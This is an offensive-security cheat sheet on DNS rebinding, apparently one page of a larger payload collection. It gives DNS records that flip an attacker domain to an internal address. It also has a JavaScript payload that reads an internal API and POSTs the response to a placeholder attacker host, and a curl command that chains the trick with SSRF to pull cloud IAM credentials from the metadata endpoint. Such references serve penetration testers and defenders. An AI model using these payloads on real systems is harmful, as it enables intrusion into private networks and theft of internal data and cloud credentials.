# DNS Rebinding

## Table of Contents

- [Bypassing IP-based Authentication](#bypassing-ip-based-authentication)
- [Chaining with SSRF](#chaining-with-ssrf)

## Bypassing IP-based Authentication

### A page on the attacker's domain can read responses from services that are only reachable from the victim's network, because the browser treats them as the same origin. [^1]

- Reading an internal API from the victim's browser
    1. DNS answers for the attacker's domain
        ```text
        rebind.[ATTACKER-DOMAIN]  A  [ATTACKER-IP]   (first lookup, very short TTL)
        rebind.[ATTACKER-DOMAIN]  A  192.168.0.10    (later lookups)
        ```

    2. Page served from `http://rebind.[ATTACKER-DOMAIN]:8080/`, on the same port as the internal service
        ```html
        <script>
            // Waits for the cached DNS answer to expire, so the next request resolves to the internal address
            setTimeout(async () => {
                const response = await fetch('/api/config');
                fetch('https://[ATTACKER-DOMAIN]/', {
                    method: 'POST',
                    body: await response.text()
                });
            }, 60000);
        </script>
        ```
    The request to `/api/config` is same-origin from the browser's point of view, so the response can be read without any CORS header.

## Chaining with SSRF

### A filter that checks the resolved address before the server makes the request can be bypassed, because the name is resolved again when the request is sent. [^2]

- Resolving to an allowed address for the check and an internal one for the request
    ```bash
    curl "https://[VULNERABLE-SERVICE]/fetch?url=http://rebind.[ATTACKER-DOMAIN]/latest/meta-data/iam/security-credentials/"
    ```
    The first lookup, used for validation, returns a public address. The second, used for the request, returns `169.254.169.254`, so the impacts described in [SSRF](./SSRF.md) apply despite the filter.

[^1]: Applies when the internal service does not validate the `Host` header and relies on network location instead of authentication. Browsers that restrict requests from public sites to private addresses, such as recent versions of Chromium, ask the user or block the request.
[^2]: Applies when the service resolves the hostname separately for the check and for the request, instead of connecting to the address it checked.
